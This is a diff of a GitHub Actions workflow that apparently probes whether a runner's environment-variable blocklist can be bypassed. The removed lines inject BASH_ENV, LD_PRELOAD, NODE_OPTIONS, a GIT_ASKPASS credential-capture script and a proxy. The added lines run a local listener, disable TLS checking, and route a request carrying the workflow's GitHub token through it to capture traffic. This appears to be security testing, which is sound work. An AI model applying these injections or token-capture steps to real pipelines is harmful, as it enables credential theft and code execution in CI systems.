@@ -1,4 +1,4 @@
-name: Comprehensive Env Injection Test
+name: Comprehensive Env Injection V2
 on:
   workflow_dispatch:
 
@@ -9,38 +9,43 @@ jobs:
   test:
     runs-on: ubuntu-latest
     steps:
-      - name: Step 1 — set dangerous env vars
+      - name: Step 1 — set proxy + capture
         run: |
-          # Set multiple code-execution env vars
-          echo "BASH_ENV=/tmp/bash_payload.sh" >> $GITHUB_ENV
-          echo "PYTHONSTARTUP=/tmp/python_payload.py" >> $GITHUB_ENV
-          echo "LD_PRELOAD=/tmp/fake.so" >> $GITHUB_ENV
-          echo "http_proxy=http://role-a-proxy.example.com:8080" >> $GITHUB_ENV
-          echo "https_proxy=http://role-a-proxy.example.com:8080" >> $GITHUB_ENV
-          echo "GIT_ASKPASS=/tmp/git_cred_capture.sh" >> $GITHUB_ENV
-          echo "NODE_OPTIONS=--require=/tmp/node_payload.js" >> $GITHUB_ENV
-          
-          # Create payload files
-          echo 'export BASH_INJECTED=YES_BASH_WORKS' > /tmp/bash_payload.sh
-          echo 'import os; os.environ["PYTHON_INJECTED"] = "YES_PYTHON_WORKS"' > /tmp/python_payload.py
-          echo '#!/bin/sh' > /tmp/git_cred_capture.sh
-          echo 'echo "GIT_ASKPASS_INJECTED=YES"' >> /tmp/git_cred_capture.sh
-          chmod +x /tmp/git_cred_capture.sh
-          
-          echo "Step 1: Set 7 dangerous env vars via GITHUB_ENV"
+          # Start capture proxy
+          python3 -c "
+import socket,threading,os
+def h(c,a):
+    d=c.recv(4096)
+    open('/tmp/cap.txt','ab').write(d+b'\n')
+    c.sendall(b'HTTP/1.1 200 OK\r\n\r\n')
+    try: d2=c.recv(8192); open('/tmp/cap.txt','ab').write(b'TLS:'+d2+b'\n')
+    except: pass
+    c.close()
+s=socket.socket(); s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
+s.bind(('127.0.0.1',9999)); s.listen(5); s.settimeout(30)
+try:
+    while True:
+        c,a=s.accept(); threading.Thread(target=h,args=(c,a)).start()
+except: pass
+s.close()
+" &
+          sleep 1
+          echo "https_proxy=http://127.0.0.1:9999" >> $GITHUB_ENV
+          echo "NODE_TLS_REJECT_UNAUTHORIZED=0" >> $GITHUB_ENV
 
-      - name: Step 2 — check which ones are active
+      - name: Step 2 — API call with token via proxy
+        env:
+          TOK: ${{ github.token }}
         run: |
-          echo "=== Blocklist bypass results ==="
-          echo "BASH_ENV=$BASH_ENV"
-          echo "BASH_INJECTED=$BASH_INJECTED"
-          echo "PYTHONSTARTUP=$PYTHONSTARTUP"
-          echo "LD_PRELOAD=$LD_PRELOAD"
-          echo "http_proxy=$http_proxy"
-          echo "https_proxy=$https_proxy"
-          echo "GIT_ASKPASS=$GIT_ASKPASS"
-          echo "NODE_OPTIONS=$NODE_OPTIONS"
+          curl -v --connect-timeout 5 -H "Authorization: Bearer $TOK" https://api.github.com/user 2>&1 | grep -iE "Connected to|Trying|CONNECT|proxy|Bearer" | head -5 || true
+          sleep 2
 
-      - name: Step 3 — test Python startup
+      - name: Step 3 — show captured
         run: |
-          python3 -c "import os; print('PYTHON_INJECTED=' + os.environ.get('PYTHON_INJECTED', 'NOT_SET'))"
+          if [ -f /tmp/cap.txt ]; then
+            echo "CAPTURED $(wc -c < /tmp/cap.txt) bytes"
+            cat /tmp/cap.txt | sed 's/ghs_[A-Za-z0-9]*/ghs_[INTERCEPTED]/g' | head -10
+            grep -c "CONNECT" /tmp/cap.txt && echo "CONNECT seen"
+          else
+            echo "No capture file"
+          fi
